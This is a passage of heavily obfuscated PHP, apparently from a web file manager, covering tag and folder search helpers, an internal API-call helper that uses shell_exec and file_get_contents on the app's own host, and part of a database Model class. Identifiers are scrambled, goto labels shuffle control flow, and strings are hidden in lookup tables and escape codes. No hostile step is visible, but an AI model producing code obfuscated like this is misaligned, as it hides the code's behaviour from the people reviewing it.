$this->_listSearchGroupTag($F´Áß”ƒáƒ, $dßÊ‘Ò¿‚›, $fã­…¾âÚ®); goto c®ğÇÅ°Å; e Ù£æÁ÷¦: } private function _listSearchTag(&$E‚è¢Ô¼ÜÙ, $Fë÷ë²Ø‚Ğ, $fçºÎ¸Ÿê–) { goto BÏ´÷Û­œ; BÏ´÷Û­œ: $cŠò¦ï·‹Â =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Fë÷ë²Ø‚Ğ[$cŠò¦ï·‹Â[2195]] || $E‚è¢Ô¼ÜÙ[$cŠò¦ï·‹Â[360]][$cŠò¦ï·‹Â[349]] > 1) { return; } $FŒ¹Äæ•µö = Model($cŠò¦ï·‹Â[2352])->listData(); goto a…ºÆ™‡Ø; Fªåš…©ñ: $bôËŸÌÀƒá = array_to_keyvalue($bôËŸÌÀƒá, $cŠò¦ï·‹Â[43], $cŠò¦ï·‹Â[85]); $FÓ§ø¸õÎö = array_unique($bôËŸÌÀƒá); $this->_listSearchMerge($E‚è¢Ô¼ÜÙ, $Fë÷ë²Ø‚Ğ, $fçºÎ¸Ÿê–, $FÓ§ø¸õÎö); goto b»’Á«‚à¦; aÅö¶¢¯¦: if (!$AœíÍô¤°Ğ) { return; } $cÁª›Ìº¦¥ = array($cŠò¦ï·‹Â[402] => array($cŠò¦ï·‹Â[17], $AœíÍô¤°Ğ), $cŠò¦ï·‹Â[1443] => USER_ID); $bôËŸÌÀƒá = Model($cŠò¦ï·‹Â[403])->field($cŠò¦ï·‹Â[85])->where($cÁª›Ìº¦¥)->select(); goto Fªåš…©ñ; a…ºÆ™‡Ø: $AœíÍô¤°Ğ = array(); $Cñ«¸ã’İ‹ = $Fë÷ë²Ø‚Ğ[$cŠò¦ï·‹Â[2195]]; foreach ($FŒ¹Äæ•µö as $eÊ“ÇæœÄ) { $cÑóåâê×‰ = $eÊ“ÇæœÄ[$cŠò¦ï·‹Â[38]]; $Eãˆö©²‹ = str_replace($cŠò¦ï·‹Â[60], $cŠò¦ï·‹Â[43], Pinyin::encode($cÑóåâê×‰)); if (stripos($cÑóåâê×‰, $Cñ«¸ã’İ‹) !== !1 || stripos($Eãˆö©²‹, $Cñ«¸ã’İ‹) !== !1) { $AœíÍô¤°Ğ[] = $eÊ“ÇæœÄ[$cŠò¦ï·‹Â[376]]; } } goto aÅö¶¢¯¦; b»’Á«‚à¦: } private function _listSearchDesc(&$dŒ´·š¼Ã¾, $fõ¶äŞ¹Æ, $Añ®÷·–‹÷) { goto f±ŞÁº¬´Ó; bÑ¤µäêÚÂ: $BŠ´ª°×‘İ = array_unique($BŠ´ª°×‘İ); if (!$BŠ´ª°×‘İ) { return; } $Bã©Ï¨ë›Î = array($B±ÓÁÏ¶¾[378] => array($B±ÓÁÏ¶¾[17], $BŠ´ª°×‘İ), $B±ÓÁÏ¶¾[99] => $B±ÓÁÏ¶¾[414], $B±ÓÁÏ¶¾[368] => array($B±ÓÁÏ¶¾[760], $B±ÓÁÏ¶¾[2197] . $fõ¶äŞ¹Æ[$B±ÓÁÏ¶¾[2195]] . $B±ÓÁÏ¶¾[2197])); goto fˆ‹»ê’Š—; f±ŞÁº¬´Ó: $B±ÓÁÏ¶¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$fõ¶äŞ¹Æ[$B±ÓÁÏ¶¾[2195]] || $dŒ´·š¼Ã¾[$B±ÓÁÏ¶¾[360]][$B±ÓÁÏ¶¾[349]] > 1) { return; } $BŠ´ª°×‘İ = $this->listSearchChildren($fõ¶äŞ¹Æ[$B±ÓÁÏ¶¾[472]]); goto bÑ¤µäêÚÂ; fˆ‹»ê’Š—: $dÈÀ¬„‹œØ = Model($B±ÓÁÏ¶¾[515])->field($B±ÓÁÏ¶¾[378])->where($Bã©Ï¨ë›Î)->select(); $f”šÄ•Ôæí = array_to_keyvalue($dÈÀ¬„‹œØ, $B±ÓÁÏ¶¾[43], $B±ÓÁÏ¶¾[378]); $this->_listSearchMerge($dŒ´·š¼Ã¾, $fõ¶äŞ¹Æ, $Añ®÷·–‹÷, $f”šÄ•Ôæí); goto dòæ´à–óÁ; dòæ´à–óÁ: } private function _listSearchGroupTag(&$D§¬‡èéÊ, $BÇÀÕ¥¡‰ù, $A‡­îÄÀ) { goto D¿ğ½¢Í½Ä; D¿ğ½¢Í½Ä: $Dšêºõƒ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$BÇÀÕ¥¡‰ù[$Dšêºõƒ”[2195]] || $D§¬‡èéÊ[$Dšêºõƒ”[360]][$Dšêºõƒ”[349]] > 1 || !$BÇÀÕ¥¡‰ù[$Dšêºõƒ”[472]]) { return; } $F¥¢èÙ†éæ = $this->sourceInfo($BÇÀÕ¥¡‰ù[$Dšêºõƒ”[472]]); goto eŒŠÄï‰††; eŒŠÄï‰††: if (!$F¥¢èÙ†éæ || $F¥¢èÙ†éæ[$Dšêºõƒ”[380]] != SourceModel::TYPE_GROUP) { return; } $dƒ¸†ÚğÎ¾ = $F¥¢èÙ†éæ[$Dšêºõƒ”[467]]; $fŸªµğ¡° = Model($Dšêºõƒ”[2353])->get($dƒ¸†ÚğÎ¾); goto a»£ğ•ŠìÃ; FßÄ«Ğ§Éœ: if (!$Eî±£ËØÈğ) { return; } $Dª½ÊÉó = array($Dšêºõƒ”[402] => array($Dšêºõƒ”[17], $Eî±£ËØÈğ), $Dšêºõƒ”[1443] => 0, $Dšêºõƒ”[39] => $Dšêºõƒ”[2215] . $dƒ¸†ÚğÎ¾); $bÖç…¢íŠÍ = Model($Dšêºõƒ”[403])->field($Dšêºõƒ”[85])->where($Dª½ÊÉó)->select(); goto b¬·÷ºƒ·Ì; a»£ğ•ŠìÃ: $Eî±£ËØÈğ = array(); $E¯ÉùÇ©Ÿ = $BÇÀÕ¥¡‰ù[$Dšêºõƒ”[2195]]; foreach ($fŸªµğ¡°[$Dšêºõƒ”[363]] as $c’ñ¦¼áõá) { $D† íêù² = $c’ñ¦¼áõá[$Dšêºõƒ”[38]]; $aË½ÁŞÄÔ = str_replace($Dšêºõƒ”[60], $Dšêºõƒ”[43], Pinyin::encode($D† íêù²)); if (stripos($D† íêù², $E¯ÉùÇ©Ÿ) !== !1 || stripos($aË½ÁŞÄÔ, $E¯ÉùÇ©Ÿ) !== !1) { $Eî±£ËØÈğ[] = $c’ñ¦¼áõá[$Dšêºõƒ”[376]]; } } goto FßÄ«Ğ§Éœ; b¬·÷ºƒ·Ì: $bÖç…¢íŠÍ = array_to_keyvalue($bÖç…¢íŠÍ, $Dšêºõƒ”[43], $Dšêºõƒ”[85]); $C‰’›Âëš© = array_unique($bÖç…¢íŠÍ); $this->_listSearchMerge($D§¬‡èéÊ, $BÇÀÕ¥¡‰ù, $A‡­îÄÀ, $C‰’›Âëš©); goto d‚°¦ôß¾Ñ; d‚°¦ôß¾Ñ: } private function _listSearchMerge(&$B‘¥êó­–Ò, $CåŒôĞÉ‡ğ, $dŠèĞ¯Ò¹¼, $E°Â‘®Ê¤) { goto C‡—õõ‹ç; e•„À´±¶: foreach ($e››×°ˆï as $FÑ óÌ¹¾) { $DãÓùèå¼Œ = $b•‡ŞÕˆ™Ï[57] . $CåŒôĞÉ‡ğ[$b•‡ŞÕˆ™Ï[472]] . $b•‡ŞÕˆ™Ï[57]; if (stripos($FÑ óÌ¹¾[$b•‡ŞÕˆ™Ï[470]], $DãÓùèå¼Œ) !== !1) { $BÄ¼½‡ß’á[] = $FÑ óÌ¹¾; } } $B‘¥êó­–Ò[$b•‡ŞÕˆ™Ï[363]] = array_merge($BÄ¼½‡ß’á, $B‘¥êó­–Ò[$b•‡ŞÕˆ™Ï[363]]); $B‘¥êó­–Ò[$b•‡ŞÕˆ™Ï[360]][$b•‡ŞÕˆ™Ï[361]] += count($BÄ¼½‡ß’á); goto dÚ§º—œÉ—; C‡—õõ‹ç: $b•‡ŞÕˆ™Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$E°Â‘®Ê¤) { return; } $bë‚›ÏğßĞ = array_to_keyvalue($B‘¥êó­–Ò[$b•‡ŞÕˆ™Ï[363]], $b•‡ŞÕˆ™Ï[43], $b•‡ŞÕˆ™Ï[378]); goto dÖ“â³Æ“‡; FÙğ¼ƒ¦ç: $e››×°ˆï = $this->field($dŠèĞ¯Ò¹¼)->where($e«ŒŒ¼šâí)->select(); if (!$e››×°ˆï) { return; } $BÄ¼½‡ß’á = array(); goto e•„À´±¶; dÖ“â³Æ“‡: $AË½›„Ç = array_diff($E°Â‘®Ê¤, $bë‚›ÏğßĞ); if (!$AË½›„Ç) { return; } $e«ŒŒ¼šâí = array($b•‡ŞÕˆ™Ï[378] => array($b•‡ŞÕˆ™Ï[17], $AË½›„Ç)); goto FÙğ¼ƒ¦ç; dÚ§º—œÉ—: } public function listSearchChildren($B‡îØ½¬, $b‡Ş”¼ƒä = 5000) { goto d­‡®¼ßÜ; d­‡®¼ßÜ: $cá×Øõ£Å˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¢¿ìùë”Â = array(); $A»Û‚ôî‰Œ = $this->sourceInfo($B‡îØ½¬); goto fÌÃ»·ğÈÂ; fÌÃ»·ğÈÂ: $aØºº¯“™Ï = array($cá×Øõ£Å˜[470] => array($cá×Øõ£Å˜[760], $A»Û‚ôî‰Œ[$cá×Øõ£Å˜[470]] . $A»Û‚ôî‰Œ[$cá×Øõ£Å˜[378]] . $cá×Øõ£Å˜[495])); $Cò×”Íá­ = $this->field($cá×Øõ£Å˜[378])->cache(null, 600)->where($aØºº¯“™Ï)->count(); if ($Cò×”Íá­ > $b‡Ş”¼ƒä) { return $this->_listSearchChildrenNear($B‡îØ½¬, $b‡Ş”¼ƒä); } goto bëå×®‹ñ•; bëå×®‹ñ•: $b¨”Šƒ±Ï™ = $this->field($cá×Øõ£Å˜[378])->where($aØºº¯“™Ï)->select(); $e¢¿ìùë”Â = array_to_keyvalue($b¨”Šƒ±Ï™, $cá×Øõ£Å˜[43], $cá×Øõ£Å˜[378]); return $e¢¿ìùë”Â; goto cÁÎâƒƒ§¤; cÁÎâƒƒ§¤: } private function _listSearchChildrenNear($dÉ‡‰ôŒ‰å, $F¢ÖÀ¸ßÓ) { goto aƒƒÌª’Ñ­; f¥¯¯Ü“‰Ü: $dÀÙÒ¨ğ·± = array_merge($dÀÙÒ¨ğ·±, array_to_keyvalue($fÆ¢Ëù‘, $f“œ ßÁ[43], $f“œ ßÁ[378])); $dÀÙÒ¨ğ·± = array_slice($dÀÙÒ¨ğ·±, 0, $F¢ÖÀ¸ßÓ); return $dÀÙÒ¨ğ·±; goto eÄ†‘â´³; aƒƒÌª’Ñ­: $f“œ ßÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÀÙÒ¨ğ·± = array(); $dÄÎŠ ‰…ƒ = array($f“œ ßÁ[472] => $dÉ‡‰ôŒ‰å); goto Eİ³˜×’Šõ; Eİ³˜×’Šõ: $fÆ¢Ëù‘ = $this->field($f“œ ßÁ[2354])->where($dÄÎŠ ‰…ƒ)->select(); $CÜùã¼à = array_to_keyvalue(array_filter_by_field($fÆ¢Ëù‘, $f“œ ßÁ[379], $f“œ ßÁ[93]), $f“œ ßÁ[43], $f“œ ßÁ[378]); $dÀÙÒ¨ğ·± = array_merge($dÀÙÒ¨ğ·±, array_to_keyvalue($fÆ¢Ëù‘, $f“œ ßÁ[43], $f“œ ßÁ[378])); goto FŞ™¿É; FŞ™¿É: if (!$CÜùã¼à) { return $dÀÙÒ¨ğ·±; } $dÄÎŠ ‰…ƒ = array($f“œ ßÁ[472] => array($f“œ ßÁ[17], $CÜùã¼à)); $fÆ¢Ëù‘ = $this->field($f“œ ßÁ[2354])->where($dÄÎŠ ‰…ƒ)->select(); goto f¥¯¯Ü“‰Ü; eÄ†‘â´³: } private function _listSearchBindPinyin($c„–²õéÌÅ, &$A¤†­—×¿à, &$c‚’Ã„åù) { goto b…ê†Éå˜é; A†¡Õ÷¡ÂÃ: $bÆµ›Ö˜±[] = array($d¡Ë‹²’îİ[2358] => $FÖ¿¢Š¶¥, $d¡Ë‹²’îİ[920] => $d¡Ë‹²’îİ[2199], array($d¡Ë‹²’îİ[2359] => $FÖ¿¢Š¶¥, $d¡Ë‹²’îİ[2360] => array($d¡Ë‹²’îİ[17], array($d¡Ë‹²’îİ[425], $d¡Ë‹²’îİ[424])))); $this->join($cù„°¿Í¾Ä); $A¤†­—×¿à = $bÆµ›Ö˜±; goto f¸ƒóÇµñô; Eñ¡°÷ù„: $bÆµ›Ö˜± = array(); $c‚’Ã„åù = str_replace(array($d¡Ë‹²’îİ[11], $d¡Ë‹²’îİ[60], $d¡Ë‹²’îİ[2355]), $d¡Ë‹²’îİ[43], $c‚’Ã„åù); $c‚’Ã„åù = $d¡Ë‹²’îİ[2356] . str_replace($d¡Ë‹²’îİ[57], $d¡Ë‹²’îİ[2357], $c‚’Ã„åù); goto FÒ¶˜ÍŞ´Æ; b…ê†Éå˜é: $d¡Ë‹²’îİ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!Input::check($c„–²õéÌÅ[$d¡Ë‹²’îİ[2195]], $d¡Ë‹²’îİ[315]) || strlen($c„–²õéÌÅ[$d¡Ë‹²’îİ[2195]]) < 2) { return; } $cù„°¿Í¾Ä = "\114\105\106\124\40\112\117\x49\x4e\40{$this->tablePrefix}\151\x6f\137\163\x6f\x75\162\x63\x65\137\155\x65\x74\141\40\155\x65\x74\x61\40\157\156\x20\163\x6f\165\x72\x63\145\x2e\163\157\x75\x72\143\145\x49\x44\40\75\40\155\145\x74\x61\x2e\163\x6f\165\162\143\x65\x49\104"; goto Eñ¡°÷ù„; FÒ¶˜ÍŞ´Æ: unset($A¤†­—×¿à[$d¡Ë‹²’îİ[38]]); foreach ($A¤†­—×¿à as $eº¨§‡ãğó => $aªíÓ¾í) { $bÆµ›Ö˜±[$d¡Ë‹²’îİ[2356] . $eº¨§‡ãğó] = $aªíÓ¾í; } $FÖ¿¢Š¶¥ = array($d¡Ë‹²’îİ[494], $d¡Ë‹²’îİ[2197] . $c„–²õéÌÅ[$d¡Ë‹²’îİ[2195]] . $d¡Ë‹²’îİ[2197]); goto A†¡Õ÷¡ÂÃ; f¸ƒóÇµñô: } private function _parseSearchWhere($AÈ§‘É×«‚) { goto c½ƒéÇØñó; dÇ¾ì‹Ã¹: if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[2195]]) && $AÈ§‘É×«‚[$dÙÑ£­ß„›[2195]]) { $bªÅ¥·àÇ­ = $AÈ§‘É×«‚[$dÙÑ£­ß„›[2195]]; $e–ÄÑ¿Š‘ = explode($dÙÑ£­ß„›[60], $bªÅ¥·àÇ­); if (strlen($bªÅ¥·àÇ­) > 2 && (substr($bªÅ¥·àÇ­, 0, 1) == $dÙÑ£­ß„›[123] && substr($bªÅ¥·àÇ­, -1) == $dÙÑ£­ß„›[123]) || substr($bªÅ¥·àÇ­, 0, 1) == $dÙÑ£­ß„›[65] && substr($bªÅ¥·àÇ­, -1) == $dÙÑ£­ß„›[65]) { $bªÅ¥·àÇ­ = substr($bªÅ¥·àÇ­, 1, -1); $e–ÄÑ¿Š‘ = array($bªÅ¥·àÇ­); } $bÏš¡ã‹[$dÙÑ£­ß„›[38]] = array($dÙÑ£­ß„›[494], $dÙÑ£­ß„›[2197] . $bªÅ¥·àÇ­ . $dÙÑ£­ß„›[2197]); if (count($e–ÄÑ¿Š‘) > 1) { $bÏš¡ã‹[$dÙÑ£­ß„›[38]] = array(); foreach ($e–ÄÑ¿Š‘ as $B‚†îŒ•à) { if (!trim($B‚†îŒ•à)) { continue; } $bÏš¡ã‹[$dÙÑ£­ß„›[38]][] = array($dÙÑ£­ß„›[494], $dÙÑ£­ß„›[2197] . trim($B‚†îŒ•à) . $dÙÑ£­ß„›[2197]); } } } return $bÏš¡ã‹; goto E“²šãÑÔÑ; fİğ…İİØ: if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[546]])) { $bÏš¡ã‹[] = array($dÙÑ£­ß„›[388] => $AÈ§‘É×«‚[$dÙÑ£­ß„›[546]], $dÙÑ£­ß„›[387] => $AÈ§‘É×«‚[$dÙÑ£­ß„›[546]], $dÙÑ£­ß„›[920] => $dÙÑ£­ß„›[2199]); } if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[381]])) { $b½—ÉåÃò = $AÈ§‘É×«‚[$dÙÑ£­ß„›[381]]; if ($b½—ÉåÃò == $dÙÑ£­ß„›[86]) { $bÏš¡ã‹[$dÙÑ£­ß„›[379]] = 1; } else { if ($b½—ÉåÃò == $dÙÑ£­ß„›[2366]) { $bÏš¡ã‹[$dÙÑ£­ß„›[379]] = 0; } else { if ($b½—ÉåÃò) { $b½—ÉåÃò = is_array($b½—ÉåÃò) ? $b½—ÉåÃò : explode($dÙÑ£­ß„›[57], $b½—ÉåÃò); $bÏš¡ã‹[$dÙÑ£­ß„›[381]] = array($dÙÑ£­ß„›[393], $b½—ÉåÃò); $bÏš¡ã‹[$dÙÑ£­ß„›[379]] = 0; } } } } if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[472]])) { $D„©ØñÏé‘ = $this->sourceInfo($AÈ§‘É×«‚[$dÙÑ£­ß„›[472]]); $bÏš¡ã‹[$dÙÑ£­ß„›[536]] = array($dÙÑ£­ß„›[494], $D„©ØñÏé‘[$dÙÑ£­ß„›[470]] . $AÈ§‘É×«‚[$dÙÑ£­ß„›[472]] . $dÙÑ£­ß„›[495]); } goto dÇ¾ì‹Ã¹; Cœ’Ó÷‹ÅŞ: if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[458]])) { $cëÂóºÎ = array($dÙÑ£­ß„›[2362], $AÈ§‘É×«‚[$dÙÑ£­ß„›[458]]); if ($bÏš¡ã‹[$dÙÑ£­ß„›[117]]) { $bÏš¡ã‹[$dÙÑ£­ß„›[117]] = array($bÏš¡ã‹[$dÙÑ£­ß„›[117]], $cëÂóºÎ, $dÙÑ£­ß„›[2363]); } else { $bÏš¡ã‹[$dÙÑ£­ß„›[117]] = $cëÂóºÎ; } } if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[2364]])) { $bÏš¡ã‹[$dÙÑ£­ß„›[87]] = array($dÙÑ£­ß„›[2361], $AÈ§‘É×«‚[$dÙÑ£­ß„›[2364]]); } if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[2365]])) { $cëÂóºÎ = array($dÙÑ£­ß„›[2362], $AÈ§‘É×«‚[$dÙÑ£­ß„›[2365]]); if ($bÏš¡ã‹[$dÙÑ£­ß„›[87]]) { $bÏš¡ã‹[$dÙÑ£­ß„›[87]] = array($bÏš¡ã‹[$dÙÑ£­ß„›[87]], $cëÂóºÎ, $dÙÑ£­ß„›[2363]); } else { $bÏš¡ã‹[$dÙÑ£­ß„›[87]] = $cëÂóºÎ; } } goto fİğ…İİØ; c½ƒéÇØñó: $dÙÑ£­ß„› =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÏš¡ã‹ = array(); if (isset($AÈ§‘É×«‚[$dÙÑ£­ß„›[711]])) { $bÏš¡ã‹[$dÙÑ£­ß„›[117]] = array($dÙÑ£­ß„›[2361], $AÈ§‘É×«‚[$dÙÑ£­ß„›[711]]); } goto Cœ’Ó÷‹ÅŞ; E“²šãÑÔÑ: } } goto f«áôªóƒ; eõ¢ùÃ‡½: function ActionCall($F—Õƒ›¶İ”) { $CÒ†’ä’ìÛ = array_slice(func_get_args(), 1); return ActionApply($F—Õƒ›¶İ”, $CÒ†’ä’ìÛ); } function ActionCallApi($cÄ‡¯¹İù», $A«†Û¡‹À = '') { goto A®®«ßÑ¼°; F°³„òôáî: return $Dçˆ†éÚˆÎ; goto D‰‡ğÌù‚î; fùŒÆÖÆ„’: $FÕ¨¾ÄãÙ = phpBinCommand(); if ($FÕ¨¾ÄãÙ && function_exists($eŠ§ŞŸƒ³[21])) { $e„Ÿ¿˜à… = $FÕ¨¾ÄãÙ . $eŠ§ŞŸƒ³[22] . BASIC_PATH . $eŠ§ŞŸƒ³[23] . escapeshellarg($cÄ‡¯¹İù»); $FªŠôÖÛ´´ = shell_exec($e„Ÿ¿˜à…); } if (!$FªŠôÖÛ´´) { $c˜äÖ˜¥ˆß = stream_context_create(array($eŠ§ŞŸƒ³[24] => array($eŠ§ŞŸƒ³[25] => 20, $eŠ§ŞŸƒ³[26] => $eŠ§ŞŸƒ³[27]))); $FªŠôÖÛ´´ = file_get_contents(APP_HOST . $eŠ§ŞŸƒ³[28] . $cÄ‡¯¹İù», !1, $c˜äÖ˜¥ˆß); } goto bõÓŒğªÙ³; A®®«ßÑ¼°: $eŠ§ŞŸƒ³ =& $_SERVER[·ü]; $CÄ˜İêğĞ› = $A«†Û¡‹À; if (is_array($A«†Û¡‹À)) { $CÄ˜İêğĞ› = $eŠ§ŞŸƒ³[16]; foreach ($A«†Û¡‹À as $CˆçÁ÷í‚¿ => $CŒÈ‰æİÍ) { $CŒÈ‰æİÍ = is_array($CŒÈ‰æİÍ) ? json_encode($CŒÈ‰æİÍ) : $CŒÈ‰æİÍ; $CŒÈ‰æİÍ = is_bool($CŒÈ‰æİÍ) ? intval($CŒÈ‰æİÍ) : $CŒÈ‰æİÍ; $CÄ˜İêğĞ› .= $eŠ§ŞŸƒ³[17] . $CˆçÁ÷í‚¿ . $eŠ§ŞŸƒ³[18] . rawurlencode($CŒÈ‰æİÍ); } } goto eõîêÜ¡ïâ; eõîêÜ¡ïâ: $D³Ø”Ğğí = Action($eŠ§ŞŸƒ³[19])->accessToken(); $cÄ‡¯¹İù» = str_replace($eŠ§ŞŸƒ³[5], $eŠ§ŞŸƒ³[4], $cÄ‡¯¹İù») . $eŠ§ŞŸƒ³[20] . $D³Ø”Ğğí . $CÄ˜İêğĞ›; $FªŠôÖÛ´´ = $eŠ§ŞŸƒ³[16]; goto fùŒÆÖÆ„’; bõÓŒğªÙ³: $F™¸ŠšÁÊ = json_decode($FªŠôÖÛ´´, !0); $Dçˆ†éÚˆÎ = is_array($F™¸ŠšÁÊ) ? $F™¸ŠšÁÊ : array($eŠ§ŞŸƒ³[29] => null, $eŠ§ŞŸƒ³[30] => $FªŠôÖÛ´´); if (!$F™¸ŠšÁÊ) { echo $FªŠôÖÛ´´; } goto F°³„òôáî; D‰‡ğÌù‚î: } function ActionCallHook($BæÚ­¯İŒÁ) { goto dßßÈê·œÇ; dßßÈê·œÇ: $DÆéö¾éÔÂ =& $_SERVER[·ü]; ob_start(); $cÛïÒ¤ø‡ç = array_slice(func_get_args(), 1); goto Aô×ï÷ ; F›ëéÏºÏÒ: $DŠò–Ú»•• = $Bá…õÈ§…· ? json_decode($Bá…õÈ§…·, !0) : $DŠò–Ú»••; $GLOBALS[$DÆéö¾éÔÂ[31]] = 0; return $DŠò–Ú»••; goto D©½Çáå¨™; Aô×ï÷ : $GLOBALS[$DÆéö¾éÔÂ[31]] = 1; $DŠò–Ú»•• = ActionApply($BæÚ­¯İŒÁ, $cÛïÒ¤ø‡ç); $Bá…õÈ§…· = ob_get_clean(); goto F›ëéÏºÏÒ; D©½Çáå¨™: } goto D—ƒÏî»Ì¤; CÙºâœçİë: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\x6f\x72\x64\x65\x72", "\141\154\x69\141\x73", "\150\x61\x76\151\x6e\147", "\147\162\157\x75\x70", "\154\x6f\x63\x6b", "\x64\151\x73\x74\151\156\143\x74", "\141\165\164\x6f", "\146\x69\x6c\164\145\162", "\166\141\x6c\x69\x64\141\164\145", "\x72\x65\x73\x75\154\164", "\x62\151\x6e\x64", "\x74\x6f\x6b\145\156"); public function __construct($E“Ü¹âî = '', $f„öˆÑ—² = '', $f‡ÂŠ¥ƒ­ï = '') { $CƒÔëâ“‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->_initialize(); if (!empty($E“Ü¹âî)) { if (strpos($E“Ü¹âî, $CƒÔëâ“‡[101])) { list($this->dbName, $this->name) = explode($CƒÔëâ“‡[101], $E“Ü¹âî); } else { $this->name = $E“Ü¹âî; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($f„öˆÑ—²)) { $this->tablePrefix = $CƒÔëâ“‡[43]; } elseif ($CƒÔëâ“‡[43] != $f„öˆÑ—²) { $this->tablePrefix = $f„öˆÑ—²; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($CƒÔëâ“‡[241]); } $this->db(0, empty($this->connection) ? $f‡ÂŠ¥ƒ­ï : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bŠóİªÖ† =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($this->fields)) { if (think_config($bŠóİªÖ†[242])) { $FùŞÃÙ™ƒé = $this->dbName ? $this->dbName : think_config($bŠóİªÖ†[243]); $aÈÁ†ß © = think_var_cache($bŠóİªÖ†[244] . strtolower(get_path_this($FùŞÃÙ™ƒé) . $bŠóİªÖ†[101] . $this->name)); if ($aÈÁ†ß ©) { $EíËµÎÃŞÀ = think_config($bŠóİªÖ†[245]); if (empty($EíËµÎÃŞÀ) || $aÈÁ†ß ©[$bŠóİªÖ†[246]] == $EíËµÎÃŞÀ) { $this->fields = $aÈÁ†ß ©; return; } } } $this->flush(); } } public function flush() { goto fÑƒ‹ÃĞ®¾; B¯ê“ë’°†: if (think_config($BĞÃ¹ÅèÉŒ[242])) { $bË•ø×Ò = $this->dbName ? $this->dbName : think_config($BĞÃ¹ÅèÉŒ[243]); think_var_cache($BĞÃ¹ÅèÉŒ[244] . strtolower(get_path_this($bË•ø×Ò) . $BĞÃ¹ÅèÉŒ[101] . $this->name), $this->fields); } goto bñáç”ŠŸ¶; Bšâç„™Úœ: foreach ($eö³Ù´§¾Î as $c¸Ã¨ˆÏ”Æ => $fŒ‡·ÊñĞ) { $d›—ùôª×¯[$c¸Ã¨ˆÏ”Æ] = $fŒ‡·ÊñĞ[$BĞÃ¹ÅèÉŒ[39]]; if ($fŒ‡·ÊñĞ[$BĞÃ¹ÅèÉŒ[46]]) { $this->fields[$BĞÃ¹ÅèÉŒ[248]] = $c¸Ã¨ˆÏ”Æ; if ($fŒ‡·ÊñĞ[$BĞÃ¹ÅèÉŒ[49]]) { $this->fields[$BĞÃ¹ÅèÉŒ[247]] = !0; } } } $this->fields[$BĞÃ¹ÅèÉŒ[249]] = $d›—ùôª×¯; if (think_config($BĞÃ¹ÅèÉŒ[245])) { $this->fields[$BĞÃ¹ÅèÉŒ[246]] = think_config($BĞÃ¹ÅèÉŒ[245]); } goto B¯ê“ë’°†; fÑƒ‹ÃĞ®¾: $BĞÃ¹ÅèÉŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->db->setModel($this->name); $eö³Ù´§¾Î = $this->db->getFields($this->getTableName()); goto D†™îîÖ¢; D†™îîÖ¢: if (!$eö³Ù´§¾Î) { return !1; } $this->fields = array_keys($eö³Ù´§¾Î); $this->fields[$BĞÃ¹ÅèÉŒ[247]] = !1; goto Bšâç„™Úœ; bñáç”ŠŸ¶: } public function switchModel($C£ğÉ­ïÛ, $fù¼ÈæÂ = array()) { $eø”“ËÄÜ¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f§ Œöâïå = ucwords(strtolower($C£ğÉ­ïÛ)) . $eø”“ËÄÜ¯[250]; if (!class_exists($f§ Œöâïå)) { think_exception($f§ Œöâïå . think_lang($eø”“ËÄÜ¯[251])); } $this->_extModel = new $f§ Œöâïå($this->name); if (!empty($fù¼ÈæÂ)) { foreach ($fù¼ÈæÂ as $cñÑ„¹ñ¯„) { $this->_extModel->setProperty($cñÑ„¹ñ¯„, $this->{$cñÑ„¹ñ¯„}); } } return $this->_extModel; } public function __set($CßŠ, $e‡Ôï”¬ÓŞ) { $this->data[$CßŠ] = $e‡Ôï”¬ÓŞ; } public function __get($F›Ê°ÓƒŒ) { return isset($this->data[$F›Ê°ÓƒŒ]) ? $this->data[$F›Ê°ÓƒŒ] : null; } public function __isset($eø°›ÎøÜÙ) { return isset($this->data[$eø°›ÎøÜÙ]); } public function __unset($D‰‹öáğª½) { unset($this->data[$D‰‹öáğª½]); } public function __call($f­†°í×®ó, $DæñÂˆŒÍ«) { $aÜÊÓ†¨Ë§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (in_array(strtolower($f­†°í×®ó), $this->methods, !0)) { $this->options[strtolower($f­†°í×®ó)] = $DæñÂˆŒÍ«[0]; return $this; } elseif (in_array(strtolower($f­†°í×®ó), array($aÜÊÓ†¨Ë§[252], $aÜÊÓ†¨Ë§[253], $aÜÊÓ†¨Ë§[254], $aÜÊÓ†¨Ë§[255], $aÜÊÓ†¨Ë§[256]), !0)) { $b­ß„²¨åÒ = isset($DæñÂˆŒÍ«[0]) ? $DæñÂˆŒÍ«[0] : $aÜÊÓ†¨Ë§[186]; $b­ß„²¨åÒ = $this->db->parseKey($b­ß„²¨åÒ); return $this->getField(strtoupper($f­†°í×®ó) . $aÜÊÓ†¨Ë§[257] . $b­ß„²¨åÒ . $aÜÊÓ†¨Ë§[258] . $f­†°í×®ó, $aÜÊÓ†¨Ë§[252]); } elseif (strtolower(substr($f­†°í×®ó, 0, 5)) == $aÜÊÓ†¨Ë§[259]) { $b­ß„²¨åÒ = think_parse_name(substr($f­†°í×®ó, 